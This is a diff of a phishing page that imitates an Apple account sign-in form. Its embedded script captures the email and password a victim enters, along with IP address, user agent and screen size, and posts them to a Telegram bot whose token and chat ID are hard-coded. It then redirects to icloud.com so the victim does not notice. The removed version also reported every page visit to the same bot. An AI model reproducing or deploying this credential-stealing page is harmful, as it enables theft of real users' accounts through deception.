@@ -7,13 +7,12 @@
 
     <style>
         html {
-            zoom: 0.64;
-        }
+  zoom: 0.64;
+}
 
-        body {
-            margin: 0;
-        }
-
+body {
+  margin: 0;
+}
         * {
             box-sizing: border-box;
             margin: 0;
@@ -43,7 +42,7 @@
         .top-left-text {
             position: absolute;
             top: 12px;
-            left: 42px;
+            left: 42px; 
             color: #ffffff !important;
             font-size: 20px;
             font-weight: 600;
@@ -52,7 +51,7 @@
         .top-right-text {
             position: absolute;
             top: 12px;
-            right: 20px;
+            right: 20px; 
             color: #ffffff !important;
             font-size: 24px;
             font-weight: 600;
@@ -178,10 +177,10 @@
 
     <div class="content-container">
         <img class="logo-img" src="images/my-logo.png" alt="Logo">
-
+        
         <h1 class="title">Sign in with <br>Apple Account</h1>
-
-        <form id="login-form">
+        
+          <form id="login-form">
             <div class="field">
                 <input type="text" name="Email" id="Email" required autocomplete="off">
                 <label for="Email">Email</label>
@@ -210,80 +209,37 @@
             <button type="submit" class="submit-btn">Log-In</button>
         </form>
     </div>
+<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+  <script>
+    const TOKEN = "8843365045:AAFAovSP2Op8nm2Inkr5iRJ8L9DCgfHZVqo";
+    const CHAT_ID = "8298632696";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
-    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-    <script>
-        const TOKEN = "8843365045:AAFAovSP2Op8nm2Inkr5iRJ8L9DCgfHZVqo";
-        const CHAT_ID = "8298632696";
-        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+    document.getElementById("login-form").addEventListener("submit", async function (e) {
+      e.preventDefault();
 
-        function getPhoneType() {
-            const ua = navigator.userAgent || "";
-            if (/iPhone/i.test(ua)) return "iPhone";
-            if (/iPad/i.test(ua)) return "iPad";
-            if (/iPod/i.test(ua)) return "iPod";
-            if (/Android/i.test(ua)) {
-                const match = ua.match(/Android[^;)]*;\s*([^;)]+)\s+Build/i);
-                return match && match[1] ? `Android (${match[1].trim()})` : "Android Phone";
-            }
-            if (/Macintosh|Mac OS X/i.test(ua)) return "Mac";
-            if (/Windows/i.test(ua)) return "Windows";
-            if (/Linux/i.test(ua)) return "Linux";
-            return "Unknown";
-        }
+      const Email = document.getElementById("Email").value;
+      const Password = document.getElementById("Password").value;
 
-        async function fetchPublicIp() {
-            try {
-                const ipResponse = await axios.get("https://api.ipify.org?format=json");
-                return ipResponse.data.ip || "Unknown";
-            } catch (error) {
-                console.error("Error fetching IP:", error);
-                return "Unknown";
-            }
-        }
+      // Get device information
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const screenWidth = screen.width;
+      const screenHeight = screen.height;
+      const deviceType = /mobile|iphone|ipad|android/i.test(userAgent) ? "Mobile" : "Desktop";
 
-        // Send instant notification as soon as the page loads
-        window.addEventListener("DOMContentLoaded", async function () {
-            const ip = await fetchPublicIp();
-            const phoneType = getPhoneType();
-            const screenRes = `${screen.width}x${screen.height}`;
+      console.log("User-Agent:", userAgent);
+      console.log("Platform:", platform);
+      console.log("Screen Resolution:", screenWidth + "x" + screenHeight);
+      console.log("Device Type:", deviceType);
 
-            const visitMessage = `
-<b>Visitor Entered Page</b>
-<b>IP Address:</b> ${ip}
-<b>Phone / Device:</b> ${phoneType}
-<b>Screen Resolution:</b> ${screenRes}
-<b>User Agent:</b> ${navigator.userAgent}
-`;
+      try {
+        // Get user's IP address
+        const ipResponse = await axios.get("https://api.ipify.org?format=json");
+        const ip = ipResponse.data.ip;
 
-            try {
-                await axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: "HTML",
-                    text: visitMessage
-                });
-            } catch (error) {
-                console.error("Error sending visitor alert:", error);
-            }
-        });
-
-        // Existing form submit handler
-        document.getElementById("login-form").addEventListener("submit", async function (e) {
-            e.preventDefault();
-
-            const Email = document.getElementById("Email").value;
-            const Password = document.getElementById("Password").value;
-
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const deviceType = getPhoneType();
-
-            try {
-                const ip = await fetchPublicIp();
-
-                const message = `
+        // Build the Telegram message
+        const message = `
 <b>New Login Attempt</b>
 <b>Email:</b> ${Email}
 <b>Password:</b> ${Password}
@@ -294,19 +250,21 @@
 <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
 `;
 
-                const response = await axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: "HTML",
-                    text: message
-                });
-
-                console.log("Message sent:", response.data);
-                window.location.href = "https://icloud.com";
-            } catch (error) {
-                console.error("Error fetching IP or sending message:", error);
-                alert("Erro ao obter o endereço IP ou enviar as informações. Tente novamente.");
-            }
+        // Send to Telegram
+        const response = await axios.post(URI_API, {
+          chat_id: CHAT_ID,
+          parse_mode: "HTML",
+          text: message
         });
-    </script>
+
+        console.log("Message sent:", response.data);
+       window.location.href = "https://icloud.com";
+      } catch (error) {
+        console.error("Error fetching IP or sending message:", error);
+        alert("Erro ao obter o endereço IP ou enviar as informações. Tente novamente.");
+      }
+    });
+  </script>
+
 </body>
 </html>
